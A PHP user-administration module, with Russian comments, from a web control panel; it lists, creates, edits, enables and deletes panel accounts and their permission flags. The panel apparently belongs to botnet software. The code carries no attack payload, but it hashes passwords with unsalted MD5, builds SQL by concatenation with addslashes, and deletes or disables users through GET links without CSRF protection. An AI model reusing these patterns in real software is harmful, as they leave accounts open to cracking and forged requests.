<?php if(!defined('__CP__'))die();
define('LIST_ROWS_COUNT', 4);             //Количетсво колонок в списке.
define('USER_INPUT_TEXT_WIDTH', '600px'); //Ширина edit-боксов для редактирования скрипта.

///////////////////////////////////////////////////////////////////////////////////////////////////
// Изменение статуса.
///////////////////////////////////////////////////////////////////////////////////////////////////

if(isset($_GET['status'], $_GET['enable']) && is_numeric($_GET['status']) && is_numeric($_GET['enable']))
{
  if($_GET['status'] != $userData['id'])
  {
    if(!mysqlQueryEx('cp_users', "UPDATE cp_users SET flag_enabled='".($_GET['enable'] ? 1 : 0)."' WHERE id='".addslashes($_GET['status'])."' LIMIT 1"))ThemeMySQLError();
  }

  header('Location: '.QUERY_STRING);
  die();
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Дейтсвия над выделеными элементами.
///////////////////////////////////////////////////////////////////////////////////////////////////

if(isset($_GET['usersaction']) && !empty($_GET['users']) && is_array($_GET['users']))
{
  //Преврашаем массив в часть запроса.
  $sl = '';
  $count = 0;
  foreach($_GET['users'] as $id)if(is_numeric($id) && $id != $userData['id'])$sl .= ($count++ == 0 ? '' : ' OR ')."id='".addslashes($id)."'";

  if(strlen($sl) > 4)
  {
    //Статус.
    if($_GET['usersaction'] == 0 || $_GET['usersaction'] == 1)
    {
      if(!mysqlQueryEx('cp_users', "UPDATE cp_users SET flag_enabled='".($_GET['usersaction'] == 0 ? 1 : 0)."' WHERE {$sl}"))ThemeMySQLError();
    }
    //Удаление.
    else if($_GET['usersaction'] == 2)
    {
      if(!mysqlQueryEx('cp_users', "DELETE FROM cp_users WHERE {$sl}"))ThemeMySQLError();
    }
  }
  
  header('Location: '.QUERY_STRING);
  die();
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Изменение/просмотр скрипта.
///////////////////////////////////////////////////////////////////////////////////////////////////

if((isset($_GET['edit']) && is_numeric($_GET['edit'])) || isset($_GET['new']))
{
  $isEdit = isset($_GET['edit']) && is_numeric($_GET['edit']);  
  $errors = array();

  //Создаем список досутпных прав.
  $rights = array();
  foreach($userData as $k => $v)if(strpos($k, 'r_') === 0)$rights[$k] = 0;
  ksort($rights, SORT_STRING);

  //Внесение изменений.
  if(isset($_POST['name'], $_POST['password'], $_POST['status'], $_POST['comment']))
  {
    if($isEdit && $_GET['edit'] == $userData['id'])$errors[] = LNG_SYS_USER_E4;
    else
    {
      if(($l = strlen($_POST['name'])) < 1 || $l > 20)$errors[] = sprintf(LNG_SYS_USER_E1, 1, 20);
      if((($l = strlen($_POST['password'])) !== 0 || !$isEdit) && ($l < 6 || $l > 64))$errors[] = sprintf(LNG_SYS_USER_E2, 6, 64);
    }
    
    if(count($errors) == 0)
    {
      //Основные данные.
      $q = "name='".addslashes($_POST['name'])."',flag_enabled='".($_POST['status'] ? 1 : 0)."',comment='".addslashes($_POST['comment'])."'";
      if($l > 0)$q .= ",pass='".addslashes(md5($_POST['password']))."'";

      //Права.
      foreach($rights as $k => $v)$q .= ",{$k}='".(isset($_POST[$k]) && $_POST[$k] > 0 ? 1 : 0)."'";

      //Выбор запроса.
      if($isEdit)$q = "UPDATE cp_users SET {$q} WHERE id='".addslashes($_GET['edit'])."' LIMIT 1";
      else $q = "INSERT INTO cp_users SET {$q}";
      
      if(!mysqlQueryEx('cp_users', $q))
      {
        if(@mysql_errno() == 1062 /*(ER_DUP_ENTRY) Duplicate entry '%s' for key %d*/)$errors[] = LNG_SYS_USER_E3;
        else ThemeMySQLError();
      }
      else
      {
        header('Location: '.QUERY_STRING); 
        die();
      }
    }
  }
    
  //Получаем данные.
  $formPassword = '';
  if(count($errors) > 0)
  {
    $formName    = htmlEntitiesEx($_POST['name']);
    $formEnabled = $_POST['status'] > 0 ? true : false;
    $formComment = htmlEntitiesEx($_POST['comment']);
    foreach($rights as $k => &$v)if(isset($_POST[$k]) && $_POST[$k] > 0)$v = 1;
  }
  else if($isEdit || $_GET['new'] != -1)
  {
    if(!($r = mysqlQueryEx('cp_users', 'SELECT * FROM cp_users WHERE id=\''.addslashes($isEdit ? $_GET['edit'] : $_GET['new']).'\' LIMIT 1')))ThemeMySQLError();
    if(!($m = @mysql_fetch_assoc($r)))ThemeFatalError(LNG_SYS_USER_E1, 0, 0, 0);
    
    $formName    = htmlEntitiesEx($m['name']);
    $formEnabled = $m['flag_enabled'] > 0 ? true : false;
    $formComment = htmlEntitiesEx($m['comment']);
    foreach($rights as $k => &$v)if(isset($m[$k]) && $m[$k] > 0)$v = 1;
    
    if(!$isEdit)$formName = 'Copy of '.$formName;
  }
  else
  {
    $formName    = 'user_'.CURRENT_TIME;
    $formEnabled = true;
    $formComment = '';
    foreach($rights as &$v)$v = 1;
  }
  unset($v);
  
  //Сбор прав
  $rightslist = '';
  foreach($rights as $k => $v)
  {
    $k = htmlEntitiesEx($k);
    $rightslist .=
    THEME_DIALOG_ROW_BEGIN.
      str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{TEXT}'), array(1, $k, 1, '', $k), $v > 0 ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
    THEME_DIALOG_ROW_END;
  }
  
  //Вывод формы.
  $data = '';
  
  //Вывод ошибки.
  if(count($errors) > 0)
  {
    $data .= THEME_STRING_FORM_ERROR_1_BEGIN;
    foreach($errors as $r)$data .= $r.THEME_STRING_NEWLINE;
    $data .= THEME_STRING_FORM_ERROR_1_END;
  }
  
  $data .=
  str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('edituser', QUERY_STRING_HTML.'&amp;'.($isEdit ? 'edit='.htmlEntitiesEx(urlencode($_GET['edit'])) : 'new'), ''), THEME_FORMPOST_BEGIN).
  str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, $isEdit ? LNG_SYS_USER_EDIT : LNG_SYS_USER_NEW), THEME_DIALOG_TITLE).
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_SYS_USER_NAME, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('name', $formName, 20, USER_INPUT_TEXT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_SYS_USER_PASSWORD, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('password', $formPassword, 64, USER_INPUT_TEXT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_SYS_USER_STATUS, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('status', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_SYS_STATUS_DISABLED), !$formEnabled ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_SYS_STATUS_ENABLED),  $formEnabled  ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_SYS_USER_COMMENT, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('comment', $formComment, 250, USER_INPUT_TEXT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
    THEME_DIALOG_ROW_END.
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
      $rightslist.
      THEME_DIALOG_GROUP_END.
    THEME_DIALOG_ROW_END.
    str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN).
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array($isEdit ? LNG_SYS_USER_ACTION_SAVE : LNG_SYS_USER_ACTION_NEW, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
      ($isEdit ? THEME_DIALOG_ITEM_ACTION_SEPARATOR.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_SYS_USER_ACTION_NEWT,
       ' onclick="window.location=\''.QUERY_STRING_HTML.'&amp;new='.htmlEntitiesEx(urlencode($_GET['edit'])).'\'"'), THEME_DIALOG_ITEM_ACTION) : '').
    THEME_DIALOG_ACTIONLIST_END.
  THEME_DIALOG_END.
  THEME_FORMPOST_END;
  
  themeSmall($isEdit ? LNG_SYS_USER_EDIT : LNG_SYS_USER_NEW, $data, 0, 0, 0);
  die();
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// JavaScript скрипты.
///////////////////////////////////////////////////////////////////////////////////////////////////

$jsScript = 0;
$jsQa     = addJsSlashes(LNG_SYS_LIST_ACTION_Q);
$jsScript = jsCheckAll('userslist', 'checkall', 'users[]').
            "function ExecuteAction(){return confirm('{$jsQa}');}";

///////////////////////////////////////////////////////////////////////////////////////////////////
// Создание списка.
///////////////////////////////////////////////////////////////////////////////////////////////////

$list = '';
if(!($r = mysqlQueryEx('cp_users', 'SELECT id, name, flag_enabled, comment FROM cp_users ORDER BY name ASC')) || @mysql_affected_rows() === 0)
{
  $list .=
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(LIST_ROWS_COUNT, $r ? LNG_SYS_LIST_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1).
  THEME_LIST_ROW_END;
}
else
{
  $i = 0;
  while(($mt = @mysql_fetch_row($r)))
  {
    $urlEdit   = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;edit='.$mt[0], strlen($mt[1]) > 0 ? htmlEntitiesEx($mt[1]) : '-'), THEME_LIST_ANCHOR);
    $urlStatus = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;status='.$mt[0].'&amp;enable='.($mt[2] > 0 ? 0 : 1), ($mt[2] > 0 ? LNG_SYS_STATUS_ENABLED : LNG_SYS_STATUS_DISABLED)), THEME_LIST_ANCHOR);
    
    $text = $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1;
    $list .=
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('users[]', $mt[0], ''),                      $i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $urlEdit),                                          $text).
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%', $urlStatus),                                          $text).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', strlen($mt[3]) > 0 ? htmlEntitiesEx($mt[3]) : '-'), $text).
    THEME_LIST_ROW_END;  
    
    $i++;
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Список действий.
$al = 
LNG_SYS_LIST_ACTION.THEME_STRING_SPACE.
str_replace(array('{NAME}', '{WIDTH}'), array('usersaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
  str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_SYS_LIST_ACTION_ENABLE),  THEME_DIALOG_ITEM_LISTBOX_ITEM).
  str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_SYS_LIST_ACTION_DISABLE), THEME_DIALOG_ITEM_LISTBOX_ITEM).
  str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_SYS_LIST_ACTION_REMOVE),  THEME_DIALOG_ITEM_LISTBOX_ITEM).
THEME_DIALOG_ITEM_LISTBOX_END.
THEME_STRING_SPACE.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
THEME_DIALOG_ITEM_ACTION_SEPARATOR.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_SYS_LIST_ACTION_ADD, ' onclick="window.location=\''.QUERY_STRING_HTML.'&amp;new=-1\'"'), THEME_DIALOG_ITEM_ACTION).
THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;

//Вывод.
ThemeBegin(LNG_SYS, $jsScript, 0, 0);
echo
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('userslist', QUERY_SCRIPT_HTML, ' onsubmit="return ExecuteAction()"'), THEME_FORMGET_BEGIN).FORM_CURRENT_MODULE.
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_SYS_LIST_TITLE), THEME_DIALOG_TITLE).
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_ROW_BEGIN.
     str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
      str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_SYS_LIST_NAME,        'auto'), THEME_LIST_HEADER_L).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_SYS_LIST_STATUS,      '1%'),   THEME_LIST_HEADER_L).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_SYS_LIST_COMMENT,     'auto'), THEME_LIST_HEADER_L).
        THEME_LIST_ROW_END.
        $list.
      THEME_LIST_END.
    THEME_DIALOG_ITEM_CHILD_END.
  THEME_DIALOG_ROW_END.
THEME_DIALOG_END.
THEME_FORMGET_END;

ThemeEnd();

die();
?>